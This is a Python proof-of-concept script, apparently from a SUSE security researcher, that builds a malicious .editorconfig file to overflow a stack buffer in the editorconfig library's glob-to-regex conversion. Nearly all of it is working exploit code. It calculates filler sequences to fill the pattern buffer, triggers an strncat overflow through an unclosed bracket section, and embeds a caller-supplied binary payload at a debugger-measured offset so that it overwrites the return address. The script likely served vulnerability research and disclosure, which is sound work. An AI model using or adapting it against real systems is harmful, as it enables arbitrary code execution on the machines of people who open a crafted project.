#!/usr/bin/python3

import argparse
import os
import sys

# Matthias Gerstner
# SUSE Linux GmbH
# matthias.gerstner@suse.com
#
# this script helps in creating an .editorconfig file which comes close to
# exploiting the library when built without optimizations.

parser = argparse.ArgumentParser()
parser.add_argument("editorconfig", help="path to the .editorconfig where the exploit is to be constructed")
parser.add_argument("exploit", help="the binary exploit buffer to embed into the .editorconfig exploit")

args = parser.parse_args()

# this sequence will be expanded to 10 bytes by the ec_glob for loop logic
expand_seq = '*?'
# - 1 for the null terminator, which is checked for in the ADD_CHAR & friend
# macros
target_buffer_size = 8194 - 1

# the library prepends an espaced version of the parent directory to pcre_str,
# so we need to take its length into account here, as well
dir_prefix = os.path.dirname(args.editorconfig).replace('-', '\\-') + "/"
dir_prefix = dir_prefix.replace('/', '\\/')
dir_prefix = f"^{dir_prefix}"

# each sequence will expand to 10 bytes (4 + 6)
needed_seqs = (target_buffer_size - len(dir_prefix)) / 10.0
needed_seqs = int(needed_seqs)

# this sequence will nearly completely fill up the `pcre_str` buffer.
initial_fillup = needed_seqs * expand_seq
expansion_size = needed_seqs * 10 + len(dir_prefix)
# but we might need to fill up with a couple of padding bytes to reach the
# end.
extra_bytes = target_buffer_size - expansion_size

print("path prefix will be", dir_prefix, f"({len(dir_prefix)} bytes)")
print(f"{needed_seqs} expansion sequences will expand up to", needed_seqs * 4 + needed_seqs * 6)
print(f"need {extra_bytes} extra bytes at the end")

output = initial_fillup + 'X' * extra_bytes

# from here on we cannot feed anything else than a '[.../...]' sequence
# anymore, which will trigger the strncat overflow.
bracket_prefix = "[/"
output += bracket_prefix
# the 375 bytes offset was determined from within GDB, since we need to hit
# the existing return address perfectly, every byte counts.
bytes_left_to_rip = 375 - len(bracket_prefix)
# we won't deliver a final ']' closing bracket, but a null byte intead
# from here on we can add any data except for newlines, ';' and '#'

output = output.encode()

with open(args.exploit, 'rb') as exploit:
    data = exploit.read()
    if len(data) != bytes_left_to_rip:
        print("Expected an exploit buffer of exactly", bytes_left_to_rip, "bytes")
        sys.exit(1)
    output += data

print("Writing out exploit to", args.editorconfig)

with open(args.editorconfig, 'wb') as editorconfig:
    # we need to wrap the exploit in section header syntax []

    # we also need an assignment inside the "section" to have ec_glob() called
    # in the first place
    editorconfig.write(b"[")
    editorconfig.write(output)
    editorconfig.write(b"]\nthis = that\n")
